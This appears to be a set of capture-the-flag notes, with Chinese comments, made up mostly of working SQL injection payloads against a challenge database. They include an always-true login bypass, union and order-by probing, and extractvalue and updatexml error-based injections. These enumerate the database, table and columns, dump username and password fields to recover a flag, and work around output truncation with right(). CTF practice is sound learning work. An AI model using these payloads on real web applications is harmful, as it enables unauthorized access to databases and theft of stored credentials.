
1' or 1=1#                	//万能密码
1' and 1=2#					//报错输入
1' and 1=1#
1' union select 1,2,3#		//查询列表数量
1' order by 3#

1'or(extractvalue(1,concat(0x7e,----/*内为payload*/-----,0x7e)))#

1'or(extractvalue(1,concat(0x7e,database(),0x7e)))#
//查询为作为其database的库名 --> XPATH syntax error:'~geek~'库名叫geek

1'or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))#
//查询为作为其table的表名 --> XPATH syntax error:'~H4rDsql~'表名叫库名叫H4rDsql

1'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)like('H4rDsq1'))),0x7e)))#
//查询为作为其table下的各个字段/列 --> XPATH syntax error:'~id,username,password~' 说明该表格下有在三个字段

1'or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))#
//报错得到flag--

如果过长限制了长度，只有左边部分flag{d22ca2ea-e37a-47a6-89

1'or(extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e)))#
//显示右边30位字符串，拼接左边

flag{d22ca2ea-e37a-47a6-8965-32ba3ab634fd}

1. username=111"&password=111&email=111
2. username=111"|| (updatexml(1,concat(0x3a,(select(user()))),1))%23&password=111&email=111
3. username=111"|| (updatexml(1,concat(0x3a,(select(flag)from(flag))),1))%23
4. username=111"+updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^R'))),1)%23